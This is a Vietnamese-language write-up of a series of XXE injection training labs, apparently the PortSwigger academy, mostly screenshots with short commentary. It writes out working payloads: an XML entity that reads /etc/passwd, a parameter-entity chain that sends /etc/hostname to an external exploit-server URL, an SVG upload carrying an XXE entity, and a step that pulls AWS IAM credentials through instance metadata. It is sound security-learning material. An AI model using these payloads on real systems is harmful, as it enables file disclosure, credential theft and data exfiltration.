![image](https://github.com/user-attachments/assets/bd775a09-6e97-4334-aeba-81c501483e52)![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)

Trong web có cái check stock dùng xml:

![image](https://github.com/user-attachments/assets/5d8bf9eb-857a-497a-8764-918e770534d9)

![image](https://github.com/user-attachments/assets/4befdeb1-bce8-42c9-9264-2c95f21b5e93)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lmao [ <!ENTITY lmao1 SYSTEM "file:///etc/passwd"> ]>

<stockCheck>
<productId>&lmao1;
</productId><storeId>2</storeId></stockCheck>
```

Tạo 1 cái ENTITY mở file /etc/passwd

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/3d647ea7-d282-493b-adf2-35668ea33d5c)

![image](https://github.com/user-attachments/assets/c865df3e-c259-4da1-9b57-01d8b7942010)

Lần này làm giống bài cũ nhưng không có được

![image](https://github.com/user-attachments/assets/eea7330a-df34-40ad-83f6-c94ce3f10446)

Tôi tra mạng thì ra được cái này [Retrieve security credentials from instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html):

![image](https://github.com/user-attachments/assets/50eb2ec6-2623-483c-ae7f-d10fb2c9a0bd)

Và tôi thêm cái latest/meta-data/iam/security-credentials/admin vào sau, nó ra:

![image](https://github.com/user-attachments/assets/7b1516ac-44b1-4709-b5a8-0f014b380a74)

Xong

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/754be58c-4156-43b5-9d8c-4e6c26ebeb6f)

Đây là req check stock:

![image](https://github.com/user-attachments/assets/27831c9a-8d98-4212-b0b0-ce016e6e3502)

Tôi thử cái payload cũ thì không có được:

![image](https://github.com/user-attachments/assets/763c56ac-10ff-4a1d-b06b-bbff6673efec)

Tôi thử thay bằng cái link burp collaborator vào:

![image](https://github.com/user-attachments/assets/7d700cd7-60c0-4126-a3bd-68c69c17cc46)

![image](https://github.com/user-attachments/assets/04319aa1-4a6b-4fde-b37d-92d3d547b3ee)

Và nó có gửi req tới, xong

![image](https://github.com/user-attachments/assets/538c6c88-7493-4097-9389-4af04c03d7f5)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/369a2da2-7c6c-4b0c-87d6-fba9b3b676cd)

Lần này thì bài không cho tôi dùng cái payload cũ nữa:

![image](https://github.com/user-attachments/assets/29a4a0b4-de77-41f1-a90d-64e8a47adb16)

Có cái này không cần phải gọi hẳn ra trong [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection):

![image](https://github.com/user-attachments/assets/4d71462f-9c22-462d-98e4-0d5269a441f4)

![image](https://github.com/user-attachments/assets/49e81264-d9cf-4dcc-9302-1e478b4e3ed9)

Mặc dù nó nhìn ra lỗi nhưng bên collaborator vẫn có req được gửi tới:

![image](https://github.com/user-attachments/assets/1b1454bd-61fa-4015-8bbd-9ca672a93bbe)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/e4528b8e-ab5f-42bd-b40d-8917ba9ee1e0)

Vẫn là cái req đấy:

![image](https://github.com/user-attachments/assets/7abfc6fd-4193-48b7-bee4-7793b9ea7ad4)

Vẫn là payload cũ và nó vẫn được:

![image](https://github.com/user-attachments/assets/3cabee7b-743e-4618-aece-2a78da12c9b6)

![image](https://github.com/user-attachments/assets/98f51724-33db-4bbe-ba5d-ff321fae1999)

Ở đây tôi tạo 1 thực thể trỏ đến link của server exploit và chạy cái này:

![image](https://github.com/user-attachments/assets/cd1899b1-00a4-424e-8e73-481be6147024)

```
<!ENTITY % hostnamefile SYSTEM "file:///etc/hostname">
<!ENTITY % lmao1 "<!ENTITY &#x25; lmao2 SYSTEM 'https://exploit-0aec009d04696226814e60da01de004c.exploit-server.net/exploit/?x=%hostnamefile;'>">
%lmao1;
%lmao2;
```
Thì cái này sẽ mở file /etc/hostname và gán vào param exploit của link server exploit, giờ thì vào access log là có nội dung của file đấy:

![image](https://github.com/user-attachments/assets/d8580921-f74a-4a2e-b01d-1b6dab2b7525)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/9da47469-ce51-4e82-9bdb-0cac0459a7de)

Vẫn như bài lab cũ, vẫn là check stock:

![image](https://github.com/user-attachments/assets/4f343042-1aa6-45f2-98c6-f565f386f6a0)

Lần này thì nhìn có dài dài hơn nhưng vẫn gửi được req đến burp collaborator:

![image](https://github.com/user-attachments/assets/88f6f8e9-94a7-4716-b8c3-2b003dc7c6a0)

![image](https://github.com/user-attachments/assets/e3c30854-2325-4132-a498-ac5cd082eafa)

Đổi từ burp collaborator sang link của server exploit và trong server exploit thì để body là cái này:

![image](https://github.com/user-attachments/assets/c84e4d56-928c-4eac-999f-bb2dbdd8b5e6)

Và cuối cùng gửi req là xong:

![image](https://github.com/user-attachments/assets/471678c0-1cd7-446f-ae0c-84492506231d)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/8208ead7-fa4c-494a-a0e7-21c34d149257)

Lần này thì cái check stock không có ở dạng xml

![image](https://github.com/user-attachments/assets/b829cf30-e952-4879-aca6-ffdb0c8d7190)

Thử sửa sang xml mà vẫn không thấy được:

![image](https://github.com/user-attachments/assets/e8220178-44bb-4d32-8811-281aaea9fed2)

Nhưng khi tôi chèn 1 cái entity vào thì nó hiện ra "Entities are not allowed for security reasons", điều này có nghĩa là nó có xml ở cái param đó:

![image](https://github.com/user-attachments/assets/1dda301b-995b-4c35-ad96-14356b409a5d)

Đề có nhắc tới cái XInclude thì XInclude (XML Inclusions) là một cơ chế cho phép nhúng hoặc hợp nhất nội dung từ tài liệu bên ngoài vào trong một tài liệu XML. Nó được định nghĩa bởi W3C và sử dụng namespace, tôi lấy cái payload ở trên [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection):

![image](https://github.com/user-attachments/assets/8960ae73-90e4-408d-8b47-d5d3bcfc84f2)

![image](https://github.com/user-attachments/assets/9d361032-8287-43fd-b0c7-bb1cac32a27e)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/76f77e4c-6d60-466d-8e69-1915d07b4dd9)

Lần này thì lỗi nằm ở upload avatar:

![image](https://github.com/user-attachments/assets/31f65523-ad3c-4bc1-8718-9f1431197780)

Tôi thử upload svg lên vì nó ở dạng xml:

![image](https://github.com/user-attachments/assets/095d1281-33c6-48d0-9ac3-27f6386d2a1d)

Do svg ở dạng xml nên tôi có tham khảo qua payload ở [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) và tìm được cái này:

![image](https://github.com/user-attachments/assets/5f90535d-d784-4123-9997-d105924b7749)

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

![image](https://github.com/user-attachments/assets/422a7ee4-56ab-475b-aff2-6d0c46b39efb)

Tải lại trang và vào thì có cái nội dung của /etc/hostname:

![image](https://github.com/user-attachments/assets/b2dbdde6-5198-4413-9b57-cb16a0e216dd)

<h1>---------------------------------------------------------</h1>
<br>



























































